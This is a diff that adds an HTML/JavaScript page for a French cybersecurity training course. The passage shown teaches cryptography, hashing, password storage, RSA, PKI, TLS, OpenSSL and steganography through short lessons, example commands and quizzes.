@@ -1,0 +1,2272 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Cyber CI · Niveau 2 · 100 Défis Avancés</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0a0e1a;color:#e2e8f0;line-height:1.65}
+header{background:#111827;padding:14px 20px;display:flex;justify-content:space-between;border-bottom:2px solid #a855f7;flex-wrap:wrap;gap:10px;position:sticky;top:0;z-index:50}
+header h1{color:#a855f7;font-size:1rem;cursor:pointer}
+.stats{color:#94a3b8;font-size:0.85rem}
+.stats b{color:#a855f7}
+main{max-width:980px;margin:0 auto;padding:16px}
+.card{background:#111827;border-radius:12px;padding:20px;margin-bottom:16px;border:1px solid #263243}
+h2{color:#a855f7;margin-bottom:10px;font-size:1.3rem}
+h3{color:#22c55e;margin:14px 0 8px;font-size:1rem}
+p{margin:8px 0}
+ul,ol{padding-left:22px;margin:8px 0}
+li{margin-bottom:4px}
+code{background:#1f2937;padding:2px 6px;border-radius:4px;color:#a855f7;font-size:0.9em}
+table{width:100%;border-collapse:collapse;margin:10px 0;font-size:0.9em}
+th,td{border:1px solid #1f2937;padding:8px;text-align:left}
+th{background:#1f2937;color:#a855f7}
+a{color:#a855f7}
+.meta{display:flex;gap:12px;font-size:0.8rem;color:#94a3b8;margin-bottom:8px;flex-wrap:wrap}
+.intro{background:#4c1d95;padding:14px;border-radius:10px;margin:12px 0;border-left:4px solid #a855f7}
+.analogy{background:#164e63;padding:12px;border-radius:10px;margin:12px 0;border-left:4px solid #22d3ee;font-style:italic}
+.section{background:#0f172a;padding:16px;border-radius:10px;margin:14px 0;border-left:4px solid #a78bfa}
+.section h3{color:#c4b5fd;margin-top:0}
+.why{background:#4c1d95;padding:12px;border-radius:8px;margin:12px 0;border-left:3px solid #a78bfa}
+.bank{background:#14532d;padding:12px;border-radius:8px;margin:12px 0;border-left:3px solid #4ade80}
+.glo{background:#1e293b;padding:12px;border-radius:8px;margin:12px 0;border-left:3px solid #94a3b8}
+.glo b{color:#fbbf24}
+.pr{background:#052e16;padding:14px;border-radius:10px;margin:14px 0;border-left:4px solid #22c55e}
+.er{background:#7f1d1d;padding:12px;border-radius:8px;margin:12px 0;border-left:3px solid #ef4444}
+.df{background:#78350f;padding:12px;border-radius:8px;margin:12px 0;border-left:3px solid #fbbf24}
+.car{background:#1e1b4b;padding:14px;border-radius:10px;margin:12px 0;border-left:4px solid #a78bfa}
+.svg-box{background:#050914;border-radius:10px;padding:16px;margin:14px 0;text-align:center;border:1px solid #1e293b}
+.svg-box svg{max-width:100%;height:auto;display:block;margin:0 auto}
+.quiz{background:#1f2937;padding:14px;border-radius:10px;margin-top:14px}
+.q{margin-bottom:14px}
+.q label{display:block;padding:9px 12px;margin:5px 0;background:#111827;border-radius:7px;cursor:pointer}
+.q label:hover{background:#334155}
+.q input{margin-right:10px}
+.ok{background:#14532d!important;border-left:4px solid #22c55e!important}
+.ko{background:#7f1d1d!important;border-left:4px solid #ef4444!important}
+.exp{background:#050914;padding:10px;border-radius:6px;margin-top:8px;font-size:0.85em;color:#cbd5e1;border-left:3px solid #fbbf24;display:none}
+.nav{margin-top:18px;display:flex;gap:10px;flex-wrap:wrap}
+button{background:#a855f7;color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:700;cursor:pointer;font-size:0.9rem}
+button:hover{background:#c084fc}
+button.sec{background:#1f2937;color:#e2e8f0}
+button.gold{background:#fbbf24;color:#0a0e1a}
+button.exam{background:#a855f7;color:#fff}
+button.exam:hover{background:#c084fc}
+.res{margin-top:12px;padding:12px;border-radius:8px;font-weight:700;text-align:center}
+.res.g{background:#14532d;color:#86efac}
+.res.r{background:#7f1d1d;color:#fca5a5}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:8px;margin-top:10px}
+.btn{background:#1f2937;padding:10px;border-radius:8px;cursor:pointer;border:2px solid transparent}
+.btn:hover{border-color:#a855f7}
+.btn.done{border-color:#22c55e;background:#14532d}
+.btn .n{font-weight:800;color:#a855f7;display:block;font-size:0.75rem}
+.btn.done .n{color:#22c55e}
+.btn .ti{display:block;font-size:0.78rem;color:#94a3b8;margin-top:2px}
+.stat{background:#1e293b;padding:16px;border-radius:12px;border-left:4px solid #a855f7;text-align:center}
+.stat .big{font-size:2em;font-weight:800;color:#a855f7;display:block}
+.stat .lbl{font-size:0.85em;color:#94a3b8}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin:16px 0}
+.cert{background:#4c1d95;padding:14px;border-radius:10px;margin:10px 0;border-left:4px solid #a855f7}
+.cert h4{color:#e9d5ff;margin:0 0 6px}
+.cert.done{background:#14532d;border-left-color:#22c55e}
+.cert.done h4{color:#86efac}
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:0.7em;font-weight:700;margin-left:6px}
+.badge.free{background:#14532d;color:#86efac}
+.badge.partial{background:#78350f;color:#fde68a}
+.badge.paid{background:#7f1d1d;color:#fca5a5}
+.job{background:#1f2937;padding:12px;border-radius:10px;border-left:4px solid #22c55e;margin-bottom:10px}
+.job h4{margin:0 0 4px;color:#86efac}
+.exam-card{background:linear-gradient(135deg,#4c1d95 0%,#1e1b4b 100%);padding:16px;border-radius:12px;margin:12px 0;border-left:4px solid #a855f7}
+.exam-card h4{color:#e9d5ff;margin:0 0 8px;font-size:1.05rem}
+.exam-card.locked{opacity:0.6;border-left-color:#475569;background:#1e293b}
+.exam-card.passed{background:linear-gradient(135deg,#14532d 0%,#052e16 100%);border-left-color:#22c55e}
+.exam-card.passed h4{color:#86efac}
+.exam-badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:0.72em;font-weight:800;margin-bottom:6px}
+.exam-badge.locked{background:#334155;color:#94a3b8}
+.exam-badge.ready{background:#7c3aed;color:#fff}
+.exam-badge.passed{background:#22c55e;color:#052e16}
+.qcount{color:#cbd5e1;font-size:0.85em;margin:6px 0}
+.level-tag{display:inline-block;padding:3px 10px;border-radius:12px;font-size:0.72em;font-weight:800;margin-left:8px}
+.level-tag.l2{background:#4c1d95;color:#e9d5ff}
+.hero{background:linear-gradient(135deg,#4c1d95 0%,#1e1b4b 100%);border-left:4px solid #a855f7;padding:24px;border-radius:12px;margin-bottom:16px}
+.hero h2{color:#e9d5ff;font-size:1.5rem;margin-bottom:8px}
+.hero p{color:#c4b5fd;font-size:0.95em}
+footer{text-align:center;padding:20px;color:#94a3b8;font-size:0.78em}
+</style>
+</head>
+<body>
+<header>
+  <h1 onclick="render()">Cyber CI · Niveau 2</h1>
+  <div class="stats" id="hs"></div>
+</header>
+<main id="app"></main>
+<footer>Etudiant L2 UVCI - Objectif Banque CI - Niveau 2 Avance</footer>
+
+<script>
+/* ============================================================
+   SVG utiles pour le niveau 2
+   ============================================================ */
+var SVG = {
+HASH: '<svg viewBox="0 0 500 180" xmlns="http://www.w3.org/2000/svg"><rect x="40" y="40" width="140" height="80" fill="#1e293b" stroke="#a855f7" rx="8"/><text x="110" y="70" fill="#c4b5fd" text-anchor="middle" font-size="11">Message</text><text x="110" y="95" fill="#cbd5e1" text-anchor="middle" font-size="10">Hello</text><polygon points="190,80 210,70 210,90" fill="#fbbf24"/><rect x="220" y="40" width="120" height="80" fill="#78350f" stroke="#fbbf24" rx="8"/><text x="280" y="70" fill="#fde68a" text-anchor="middle" font-size="11">SHA-256</text><text x="280" y="95" fill="#cbd5e1" text-anchor="middle" font-size="10">Fonction</text><polygon points="350,80 370,70 370,90" fill="#22c55e"/><rect x="380" y="40" width="100" height="80" fill="#052e16" stroke="#22c55e" rx="8"/><text x="430" y="70" fill="#86efac" text-anchor="middle" font-size="10">Empreinte</text><text x="430" y="90" fill="#cbd5e1" text-anchor="middle" font-size="9">2cf24d...</text><text x="250" y="155" fill="#94a3b8" text-anchor="middle" font-size="10">Avalanche : 1 bit change = tout change</text></svg>',
+OWASP: '<svg viewBox="0 0 500 250" xmlns="http://www.w3.org/2000/svg" font-size="10"><rect x="20" y="20" width="460" height="30" fill="#7f1d1d" stroke="#ef4444" rx="4"/><text x="250" y="40" fill="#fca5a5" text-anchor="middle" font-weight="bold" font-size="12">OWASP Top 10 (2021)</text><text x="30" y="70" fill="#fca5a5">1. Broken Access Control</text><text x="30" y="90" fill="#fca5a5">2. Cryptographic Failures</text><text x="30" y="110" fill="#fbbf24">3. Injection (SQLi, XSS)</text><text x="30" y="130" fill="#fbbf24">4. Insecure Design</text><text x="30" y="150" fill="#fde68a">5. Security Misconfiguration</text><text x="30" y="170" fill="#fde68a">6. Vulnerable Components</text><text x="30" y="190" fill="#86efac">7. Auth Failures</text><text x="30" y="210" fill="#86efac">8. Data Integrity Failures</text><text x="30" y="230" fill="#7dd3fc">9. Logging Failures · 10. SSRF</text></svg>',
+SIEM: '<svg viewBox="0 0 500 180" xmlns="http://www.w3.org/2000/svg"><rect x="20" y="20" width="90" height="50" fill="#0c4a6e" stroke="#00d4ff" rx="6"/><text x="65" y="50" fill="#7dd3fc" text-anchor="middle" font-size="10">Endpoints</text><rect x="130" y="20" width="90" height="50" fill="#0c4a6e" stroke="#00d4ff" rx="6"/><text x="175" y="50" fill="#7dd3fc" text-anchor="middle" font-size="10">Firewall</text><rect x="240" y="20" width="90" height="50" fill="#0c4a6e" stroke="#00d4ff" rx="6"/><text x="285" y="50" fill="#7dd3fc" text-anchor="middle" font-size="10">Serveurs</text><rect x="350" y="20" width="130" height="50" fill="#0c4a6e" stroke="#00d4ff" rx="6"/><text x="415" y="50" fill="#7dd3fc" text-anchor="middle" font-size="10">Applications</text><polygon points="120,95 380,95 380,120 120,120" fill="#4c1d95" stroke="#a855f7" stroke-width="2"/><text x="250" y="112" fill="#e9d5ff" text-anchor="middle" font-weight="bold" font-size="12">SIEM : collecte + correlation</text><polygon points="250,125 240,140 260,140" fill="#a855f7"/><rect x="150" y="145" width="200" height="30" fill="#052e16" stroke="#22c55e" rx="6"/><text x="250" y="165" fill="#86efac" text-anchor="middle" font-size="11">Alertes analyste SOC</text></svg>',
+HTTPS: '<svg viewBox="0 0 500 160" xmlns="http://www.w3.org/2000/svg"><rect x="60" y="50" width="380" height="80" fill="#052e16" stroke="#22c55e" stroke-width="2" rx="10"/><text x="250" y="80" fill="#22c55e" text-anchor="middle" font-weight="bold" font-size="14">TLS 1.3</text><text x="250" y="105" fill="#86efac" text-anchor="middle" font-size="11">AES-256-GCM + ECDHE</text><rect x="180" y="20" width="140" height="30" fill="#1e293b" stroke="#fbbf24" rx="6"/><text x="250" y="40" fill="#fbbf24" text-anchor="middle" font-size="11">Client &#8596; Serveur</text></svg>',
+CRYPTO: '<svg viewBox="0 0 500 160" xmlns="http://www.w3.org/2000/svg"><rect x="40" y="40" width="150" height="80" fill="#1e293b" stroke="#fbbf24" rx="8"/><text x="115" y="70" fill="#fbbf24" text-anchor="middle" font-size="11">Clair</text><text x="115" y="95" fill="#cbd5e1" text-anchor="middle" font-size="10">"Hello"</text><rect x="210" y="40" width="80" height="80" fill="#4c1d95" stroke="#a855f7" rx="8"/><text x="250" y="75" fill="#e9d5ff" text-anchor="middle" font-size="10">Cle</text><text x="250" y="95" fill="#e9d5ff" text-anchor="middle" font-size="10">Chiffre</text><rect x="310" y="40" width="150" height="80" fill="#7f1d1d" stroke="#ef4444" rx="8"/><text x="385" y="70" fill="#fca5a5" text-anchor="middle" font-size="11">Chiffre</text><text x="385" y="95" fill="#cbd5e1" text-anchor="middle" font-size="10">a8f3b2...</text></svg>',
+CLOUD: '<svg viewBox="0 0 500 180" xmlns="http://www.w3.org/2000/svg"><ellipse cx="250" cy="60" rx="180" ry="40" fill="#4c1d95" stroke="#a855f7" stroke-width="2"/><text x="250" y="65" fill="#e9d5ff" text-anchor="middle" font-weight="bold" font-size="13">CLOUD (AWS / Azure / GCP)</text><rect x="40" y="120" width="80" height="40" fill="#0c4a6e" stroke="#00d4ff" rx="4"/><text x="80" y="145" fill="#7dd3fc" text-anchor="middle" font-size="10">IAM</text><rect x="140" y="120" width="80" height="40" fill="#0c4a6e" stroke="#00d4ff" rx="4"/><text x="180" y="145" fill="#7dd3fc" text-anchor="middle" font-size="10">VPC</text><rect x="240" y="120" width="80" height="40" fill="#0c4a6e" stroke="#00d4ff" rx="4"/><text x="280" y="145" fill="#7dd3fc" text-anchor="middle" font-size="10">S3/KMS</text><rect x="340" y="120" width="120" height="40" fill="#0c4a6e" stroke="#00d4ff" rx="4"/><text x="400" y="145" fill="#7dd3fc" text-anchor="middle" font-size="10">CloudTrail</text></svg>'
+};
+
+/* ============================================================
+   NIVEAU 2 : 100 defis (101-200)
+   Modules :
+   - Module 6 : Cryptographie & PKI (101-120)
+   - Module 7 : Web Pentest & OWASP (121-140)
+   - Module 8 : Forensics & Incident Response (141-160)
+   - Module 9 : Cloud & DevSecOps (161-180)
+   - Module 10 : SOC avance & Threat Hunting (181-200)
+   ============================================================ */
+var D = [
+/* ---------- MODULE 6 : CRYPTOGRAPHIE & PKI (101-120) ---------- */
+{id:101,t:"Introduction a la cryptographie",d:35,
+intro:"La cryptographie protege la confidentialite, l'integrite et l'authenticite des donnees. Elle est au coeur de toute securite moderne.",
+analogy:"Un coffre-fort numerique : seul celui qui a la cle peut ouvrir.",
+sections:[
+{titre:"3 objectifs",contenu:"<p><b>Confidentialite</b> : seul le destinataire lit (chiffrement). <b>Integrite</b> : le message n'a pas ete modifie (hash). <b>Authenticite</b> : l'emetteur est bien celui qu'il pretend (signature).</p>",svg:"CRYPTO"},
+{titre:"Symetrique vs asymetrique",contenu:"<p><b>Symetrique</b> : 1 seule cle (AES). Rapide. Probleme : partager la cle. <b>Asymetrique</b> : 2 cles (RSA, ECC), cle publique + privee. Lent mais resout l'echange de cle.</p>"},
+{titre:"Usage dans une banque",contenu:"<p>TLS pour les connexions web, signature des transactions, hash des mots de passe, chiffrement des disques (LUKS/BitLocker), HSM pour les cles critiques.</p>"}
+],
+why:"Toute fuite de donnees bancaires est catastrophique. La crypto est la derniere ligne de defense.",
+bank:"PCI-DSS impose le chiffrement des donnees de cartes en transit et au repos.",
+glo:"<b>AES</b> : symetrique. <b>RSA/ECC</b> : asymetrique. <b>Hash</b> : empreinte. <b>HSM</b> : materiel securise.",
+pr:["openssl version","openssl enc -aes-256-cbc","Comparer temps AES vs RSA"],
+er:"Ne jamais utiliser MD5 ou SHA-1 pour la securite (casses).",
+df:"Chiffrer un fichier avec AES-256-GCM et le dechiffrer.",
+proj:"Script Python de chiffrement AES sur GitHub.",
+q:[{q:"AES est :",a:["Asymetrique","Symetrique","Hash","Signature"],c:1,e:"AES = 1 cle partagee."},{q:"RSA sert surtout a :",a:["Chiffrer des Go","Echanger des cles/signer","Hacher","Rien"],c:1,e:"Asymetrique pour echange/signature."}]},
+
+{id:102,t:"Le chiffrement symetrique (AES)",d:40,
+intro:"AES (Advanced Encryption Standard) est l'algorithme symetrique standard. Bloc de 128 bits, cles 128/192/256 bits.",
+analogy:"Un cadenas a code partage : meme cle pour fermer et ouvrir.",
+sections:[
+{titre:"Modes de chiffrement",contenu:"<p><b>CBC</b> : bloc par bloc, ancien. <b>GCM</b> : moderne, authentifie (AEAD). <b>CTR</b> : compteur, rapide. <b>ECB</b> : NE JAMAIS UTILISER (motifs visibles).</p>"},
+{titre:"Exemple OpenSSL",contenu:"<p>Chiffrement : <code>openssl enc -aes-256-cbc -salt -in f.txt -out f.enc</code>. Dechiffrement : <code>openssl enc -d -aes-256-cbc -in f.enc -out f.txt</code>.</p>"},
+{titre:"En Python",contenu:"<p><code>from cryptography.fernet import Fernet</code> ; genere une cle, chiffre avec Fernet (AES + HMAC), dechiffre. Simple et sur.</p>"}
+],
+why:"AES protege les donnees au repos (disques) et en transit (TLS).",
+bank:"Chiffrement des sauvegardes bancaires avant stockage cloud.",
+glo:"<b>AEAD</b> : chiffrement authentifie. <b>IV</b> : vecteur d'initialisation. <b>Salt</b> : aleatoire.",
+pr:["openssl enc -aes-256-cbc -salt","Dechiffrer","Verifier integrite avec sha256sum"],
+er:"Reutiliser un IV en mode CBC = faille grave.",
+df:"Chiffrer/dechiffrer 3 fichiers avec AES-256-GCM.",
+proj:"Comparatif CBC vs GCM documente.",
+q:[{q:"Mode a eviter :",a:["GCM","CBC","CTR","ECB"],c:3,e:"ECB = motifs repetes."},{q:"AES-256 cle :",a:["128","192","256","512"],c:2,e:"256 bits."}]},
+
+{id:103,t:"Fonctions de hachage",d:35,
+intro:"Un hash transforme un message en empreinte de taille fixe. Irreversible, deterministe, resiste aux collisions.",
+analogy:"Empreinte digitale numerique d'un message.",
+sections:[
+{titre:"Fonctions recommandees",contenu:"<p><b>SHA-256 / SHA-3</b> : surs. <b>BLAKE2/BLAKE3</b> : rapides et surs. <b>MD5, SHA-1</b> : CASSES, ne plus utiliser.</p>",svg:"HASH"},
+{titre:"Usage",contenu:"<ul><li>Verifier integrite d'un fichier (checksum).</li><li>Stocker MDP (mais avec bcrypt/argon2 !).</li><li>Signature numerique (hash + cle privee).</li><li>Git utilise SHA-1 (en transition vers SHA-256).</li></ul>"},
+{titre:"Avalanche",contenu:"<p>Un seul bit change = tout le hash change. Ex : sha256(hello) vs sha256(hellp) completement differents.</p>"}
+],
+why:"Verifier l'integrite d'un binaire telecharge, stocker MDP de facon securisee.",
+bank:"Hash des mots de passe clients avec bcrypt/argon2. Hash des transactions pour audit.",
+glo:"<b>Collision</b> : 2 messages = meme hash. <b>Salt</b> : donnee aleatoire ajoutee avant hash.",
+pr:["sha256sum fichier","echo hello | sha256sum","Comparer avec hellp"],
+er:"Ne jamais hasher un MDP sans salt ni facteur de cout.",
+df:"Comparer SHA-256, SHA-3, BLAKE2 sur 3 fichiers.",
+proj:"Script Python de hash de repertoire.",
+q:[{q:"MD5 :",a:["Sur","Casse","Moderne","Quantum"],c:1,e:"MD5 casse depuis 2004."},{q:"Hash :",a:["Reversible","Irreversible","Chiffrement","Signature"],c:1,e:"Irreversible (a moins de brute-force)."}]},
+
+{id:104,t:"Hash de mots de passe (bcrypt, argon2)",d:40,
+intro:"Ne stockez JAMAIS un mot de passe en clair ou avec un simple hash rapide. Utilisez des algorithmes lents avec salt.",
+analogy:"Une porte blindee qui ralentit les cambriolages.",
+sections:[
+{titre:"Pourquoi pas SHA-256 seul",contenu:"<p>SHA-256 est trop rapide : milliards de hash/sec sur GPU. Un attaquant teste des dictionnaires entiers en secondes.</p>"},
+{titre:"bcrypt, scrypt, argon2",contenu:"<p><b>bcrypt</b> : facteur de cout ajustable. <b>scrypt</b> : utilise RAM. <b>argon2</b> : gagnant du Password Hashing Competition, recommande aujourd'hui.</p><p>Chacun integre un salt aleatoire : 2 utilisateurs avec le meme MDP ont des hash differents.</p>"},
+{titre:"En Python",contenu:"<p><code>import bcrypt</code> ; <code>bcrypt.hashpw(mdp, bcrypt.gensalt())</code> ; verifier avec <code>bcrypt.checkpw()</code>.</p>"}
+],
+why:"Une base de MDP leakee = catastrophe. Avec bcrypt/argon2, casser prend des annees.",
+bank:"Obligation PCI-DSS : MDP hashes avec algorithme fort et salt.",
+glo:"<b>Salt</b> : empeche les rainbow tables. <b>Cost</b> : iterations (lenteur volontaire).",
+pr:["bcrypt.hashpw en Python","Comparer temps de hash","argon2-cffi"],
+er:"Ne jamais ecrire son propre algorithme de hash.",
+df:"Casser SHA-256 vs bcrypt (avec wordlist) pour comparer.",
+proj:"Demo bcrypt vs SHA-256 sur GitHub.",
+q:[{q:"Recommande aujourd'hui :",a:["SHA-256","MD5","argon2","SHA-1"],c:2,e:"Argon2 = standard moderne."},{q:"Salt sert a :",a:["Accelerer","Empecher rainbow tables","Chiffrer","Signer"],c:1,e:"Empeche les tables precalculees."}]},
+
+{id:105,t:"Cryptographie asymetrique (RSA)",d:45,
+intro:"RSA utilise 2 cles : publique (chiffrer/verifier) et privee (dechiffrer/signer). Securite basee sur la factorisation des grands nombres premiers.",
+analogy:"Une boite aux lettres publique : tout le monde peut y deposer, seul le proprietaire ouvre.",
+sections:[
+{titre:"Taille des cles",contenu:"<p>RSA-2048 minimum, RSA-4096 pour long terme. <b>ECC</b> (Elliptic Curve) offre la meme securite avec cles plus courtes (256 bits = RSA-3072).</p>"},
+{titre:"Usage",contenu:"<ul><li>TLS : echange de cle (ECDHE) puis chiffrement symetrique AES.</li><li>Signature de code, certificats, emails.</li><li>SSH : cles RSA ou Ed25519 (recommande).</li></ul>"},
+{titre:"Generer une cle",contenu:"<p><code>openssl genrsa -out priv.pem 2048</code> ; <code>openssl rsa -in priv.pem -pubout -out pub.pem</code>.</p>"}
+],
+why:"RSA est partout : HTTPS, SSH, signature de code, certificats X.509.",
+bank:"Signature des transactions, certificats serveurs bancaires, mTLS.",
+glo:"<b>Modulus</b> : n = p*q. <b>Exposant public</b> : e = 65537. <b>Exposant prive</b> : d.",
+pr:["openssl genrsa 2048","openssl rsa -pubout","openssl pkeyutl -encrypt/decrypt"],
+er:"RSA-1024 est casse. Minimum 2048.",
+df:"Generer paire RSA, chiffrer/dechiffrer un message.",
+proj:"Script d'echange de messages chiffres RSA.",
+q:[{q:"RSA minimum :",a:["512","1024","2048","16384"],c:2,e:"2048 min aujourd'hui."},{q:"Cle publique sert a :",a:["Dechiffrer","Chiffrer/verifier","Signer","Rien"],c:1,e:"Chiffre et verifie les signatures."}]},
+
+{id:106,t:"Signatures numeriques",d:35,
+intro:"Une signature numerique prouve l'authenticite et l'integrite d'un message. Elle utilise la cle privee de l'emetteur.",
+analogy:"Un sceau de cire numerique infalsifiable.",
+sections:[
+{titre:"Principe",contenu:"<ol><li>Emetteur : hash du message.</li><li>Chiffre ce hash avec sa cle privee = signature.</li><li>Destinataire : dechiffre avec la cle publique de l'emetteur, compare le hash.</li></ol><p>Si les hashes correspondent et la cle publique est verifiee : message authentique et intact.</p>"},
+{titre:"Algorithmes",contenu:"<p><b>RSA-PSS</b>, <b>ECDSA</b>, <b>Ed25519</b> (rapide et sur), <b>DSA</b> (ancien).</p>"},
+{titre:"Usages",contenu:"<p>Certificats X.509, code signing (Windows, Android), emails (PGP/S/MIME), JWT, blockchain.</p>"}
+],
+why:"Verifier qu'un binaire n'a pas ete modifie, qu'un email vient du bon expediteur.",
+bank:"Signature electronique de documents, transactions. Obligation legale.",
+glo:"<b>Non-repudiation</b> : l'emetteur ne peut nier. <b>PSS</b> : mode de signature RSA moderne.",
+pr:["openssl dgst -sha256 -sign priv.pem -out sig f.txt","openssl dgst -sha256 -verify pub.pem -signature sig f.txt"],
+er:"Ne jamais signer le message directement, toujours son hash.",
+df:"Signer et verifier 3 fichiers differents.",
+proj:"Mini PKI de signature sur GitHub.",
+q:[{q:"Signature utilise :",a:["Cle publique","Cle privee","Hash seul","Rien"],c:1,e:"Signature = chiffrer hash avec cle privee."},{q:"Verifier signature :",a:["Cle publique","Cle privee","Hash","Rien"],c:0,e:"Cle publique de l'emetteur."}]},
+
+{id:107,t:"PKI et certificats X.509",d:50,
+intro:"Une PKI (Public Key Infrastructure) gere les cles et certificats dans une organisation. Un certificat X.509 lie une identite a une cle publique, signe par une Autorite de Certification (CA).",
+analogy:"Une carte d'identite numerique delivree par l'Etat.",
+sections:[
+{titre:"Composants",contenu:"<ul><li><b>CA</b> : Autorite de Certification (Let's Encrypt, DigiCert).</li><li><b>Certificat</b> : identite + cle publique + signature CA.</li><li><b>CRL / OCSP</b> : verification de revocation.</li><li><b>Chaine de confiance</b> : Root CA → Intermediate CA → Certificat serveur.</li></ul>"},
+{titre:"Contenu d'un certificat",contenu:"<p>Sujet (CN), emetteur, validite (notBefore/notAfter), cle publique, SANs (domaines), usage, signature CA.</p>"},
+{titre:"Inspecter un certificat",contenu:"<p><code>openssl x509 -in cert.pem -text -noout</code>. Ou cliquer sur le cadenas dans le navigateur.</p>"}
+],
+why:"Un certificat mal verifie = MITM. Un cert expire = indisponibilite.",
+bank:"TLS bancaire, mTLS API, signature des docs, HSM pour la cle privee.",
+glo:"<b>CA</b> : autorite. <b>CRL</b> : liste de revocation. <b>OCSP</b> : verif en ligne. <b>SAN</b> : domaines.",
+pr:["Visiter un site HTTPS","Cliquer cadenas","Voir le certificat","Verifier la chaine","openssl s_client -connect"],
+er:"Ne pas verifier les certificats (curl -k en prod) = MITM.",
+df:"Analyser le certificat de votre banque.",
+proj:"Rapport d'analyse de 3 certificats (banque, gouv, e-commerce).",
+q:[{q:"CA :",a:["Autorite de Certification","Cle","Hash","Rien"],c:0,e:"Elle signe les certificats."},{q:"OCSP sert a :",a:["Chiffrer","Verifier revocation","Signer","Rien"],c:1,e:"Statut de revocation en ligne."}]},
+
+{id:108,t:"TLS/SSL en profondeur",d:45,
+intro:"TLS (Transport Layer Security) chiffre les communications. TLS 1.3 est la version actuelle (2018), TLS 1.2 encore autorise.",
+analogy:"Un tunnel secret entre client et serveur.",
+sections:[
+{titre:"Handshake TLS 1.3",contenu:"<ol><li>ClientHello (versions, ciphers, cle publique ECDHE).</li><li>ServerHello (choix, cle ECDHE, certificat).</li><li>Verification du certificat.</li><li>Derivation des cles de session (AES).</li></ol><p>1 round-trip en TLS 1.3 (vs 2 en 1.2).</p>",svg:"HTTPS"},
+{titre:"Ciphers recommandes",contenu:"<p>TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256. <b>Eviter</b> : RC4, DES, 3DES, TLS 1.0/1.1.</p>"},
+{titre:"Outils",contenu:"<p><code>openssl s_client -connect site:443 -tls1_3</code>. Test en ligne : ssllabs.com/ssltest.</p>"}
+],
+why:"TLS mal configure = interception. TLS 1.0/1.1 deprecies = non conformite.",
+bank:"PCI-DSS impose TLS 1.2+. TLS 1.3 recommande.",
+glo:"<b>ECDHE</b> : echange de cle ephemere (Perfect Forward Secrecy). <b>AEAD</b> : chiffre + authentifie.",
+pr:["openssl s_client -connect google.com:443","ssllabs.com/ssltest","Verifier version TLS"],
+er:"TLS 1.0/1.1 = vulnerable (BEAST, POODLE).",
+df:"Auditer TLS de 3 sites bancaires avec SSL Labs.",
+proj:"Rapport TLS sur 5 sites avec recommandations.",
+q:[{q:"TLS actuel :",a:["1.0","1.1","1.2","1.3"],c:3,e:"TLS 1.3 (2018)."},{q:"Perfect Forward Secrecy :",a:["RC4","ECDHE","DES","MD5"],c:1,e:"Cles ephemeres = PFS."}]},
+
+{id:109,t:"OpenSSL en pratique",d:40,
+intro:"OpenSSL est l'outil en ligne de commande pour la cryptographie : generer des cles, signer, chiffrer, verifier.",
+analogy:"Le couteau suisse de la cryptographie.",
+sections:[
+{titre:"Commandes essentielles",contenu:"<ul><li><code>openssl rand -hex 32</code> : 32 octets aleatoires.</li><li><code>openssl genrsa 2048</code> : cle RSA.</li><li><code>openssl req -new -x509</code> : certificat auto-signe.</li><li><code>openssl dgst -sha256 fichier</code> : hash.</li><li><code>openssl enc -aes-256-cbc</code> : chiffrement.</li></ul>"},
+{titre:"Generer un certificat",contenu:"<p><code>openssl req -new -x509 -newkey rsa:2048 -keyout cle.pem -out cert.pem -days 365 -nodes</code>.</p>"},
+{titre:"Vulnerabilite Heartbleed",contenu:"<p>OpenSSL 1.0.1 a eu Heartbleed (CVE-2014-0160) : fuite memoire. Toujours mettre a jour OpenSSL.</p>"}
+],
+why:"Base de tout outil de crypto. Indispensable en pentest et audit.",
+bank:"Generation de cles, signature de documents, audit TLS.",
+glo:"<b>PEM</b> : format texte base64. <b>DER</b> : format binaire.",
+pr:["openssl rand","openssl genrsa","openssl req -x509","openssl dgst -sha256"],
+er:"Ne pas mettre -nodes = cle chiffree demandee (bloquant scripts).",
+df:"Generer cle + certificat auto-signe + verifier.",
+proj:"Script d'audit TLS automatise.",
+q:[{q:"Generer 32 octets :",a:["openssl gen","openssl rand -hex 32","openssl hash","openssl key"],c:1,e:"openssl rand."},{q:"Certificat auto-signe :",a:["req -x509","genrsa","dgst","enc"],c:0,e:"req -x509."}]},
+
+{id:110,t:"Steganographie",d:35,
+intro:"La steganographie cache un message dans un autre media (image, audio, video) sans que l'oeil/oreille ne le remarque.",
+analogy:"Message invisible a l'encre sympathique.",
+sections:[
+{titre:"Techniques",contenu:"<ul><li><b>LSB</b> : modifier les bits de poids faible des pixels.</li><li><b>Metadata</b> : cacher dans EXIF.</li><li><b>Audio</b> : frequences inaudibles.</li></ul>"},
+{titre:"Outils",contenu:"<p><b>Steghide</b> : images/audio + passphrase. <b>Exiftool</b> : metadata. <b>zsteg</b> : PNG. <b>binwalk</b> : fichiers caches.</p>"},
+{titre:"Detection",contenu:"<p>Comparer avec l'original, analyse statistique, binwalk pour trouver des donnees annexes.</p>"}
+],
+why:"Utilisee par les malwares pour cacher des payloads. Aussi en CTF.",
+bank:"Exfiltration de donnees via images anodines. Formation SOC.",
+glo:"<b>LSB</b> : Least Significant Bit. <b>Stego</b> : cache. <b>Steganalyse</b> : detection.",
+pr:["steghide embed -cf img.jpg -ef secret.txt","steghide extract -sf img.jpg","exiftool img.jpg"],
+er:"Recompresser l'image detruit le message LSB.",
+df:"Cacher un message dans une image et le retrouver.",
+proj:"Write-up stegano sur GitHub.",
+q:[{q:"Steghide :",a:["Cache","Chiffre","Signe","Hash"],c:0,e:"Cache dans image/audio."},{q:"Exiftool :",a:["Metadata","Chiffrement","Hash","Rien"],c:0,e:"Lit les metadonnees."}]},
+
+{id:111,t:"Cryptographie post-quantique",d:45,
+intro:"Les ordinateurs quantiques casseront RSA et ECC (algorithme de Shor). La cryptographie post-quantique prepare l'avenir.",
+analogy:"Passer de la serrure mecanique a la serrure electronique avant que le cambrioleur ne maitrise la premiere.",
+sections:[
